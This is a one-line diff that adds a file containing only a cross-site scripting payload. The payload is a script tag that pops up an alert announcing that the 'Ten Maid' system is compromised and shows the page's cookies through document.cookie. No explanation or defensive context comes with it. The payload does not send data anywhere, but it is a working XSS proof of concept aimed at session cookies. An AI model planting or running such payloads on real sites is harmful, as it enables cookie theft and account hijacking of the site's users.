@@ -1,0 +1,1 @@
+<script>alert('🚨 XSS ATTACK! Ten Maid system compromised - attacker has access to: ' + document.cookie);</script>
